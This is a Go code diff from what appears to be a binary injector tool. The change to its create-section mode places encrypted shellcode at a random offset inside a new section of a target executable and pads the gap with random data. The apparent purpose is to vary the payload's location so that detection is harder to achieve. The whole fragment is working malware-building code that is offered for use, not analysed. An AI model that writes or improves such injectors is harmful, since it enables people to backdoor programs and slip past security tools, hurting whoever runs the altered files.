@@ -618,18 +618,20 @@ func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string)
 
 func (inj *Injector) useCreateSectionMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
 	shellcode := inj.encryptShellcode(ctx, sc)
-	size := reservedLoaderSize + uint32(len(shellcode)) // #nosec G115
+	randomOffset := uint32(inj.rand.Intn(2048))
+	scOffset := reservedLoaderSize + randomOffset
+	size := scOffset + uint32(len(shellcode)) // #nosec G115
 	section, err := inj.createSection(inj.opts.SectionName, size)
 	if err != nil {
 		return "", err
 	}
 	inj.section = section
 	// write random data for padding caves between loader and shellcode
-	_, _ = inj.rand.Read(inj.dup[inj.section.Offset : inj.section.Offset+reservedLoaderSize])
+	_, _ = inj.rand.Read(inj.dup[inj.section.Offset : inj.section.Offset+scOffset])
 	// write encrypted shellcode
-	copy(inj.dup[section.Offset+reservedLoaderSize:], shellcode)
+	copy(inj.dup[section.Offset+scOffset:], shellcode)
 	ctx.CreateSection = true
-	ctx.ShellcodeOffset = section.VirtualAddress + reservedLoaderSize
+	ctx.ShellcodeOffset = section.VirtualAddress + scOffset
 	inj.ctx.Mode = ModeCreateSection
 	// remove the flag in assembly source
 	return strings.ReplaceAll(src, "{{STUB CodeCaveMode STUB}}", ""), nil
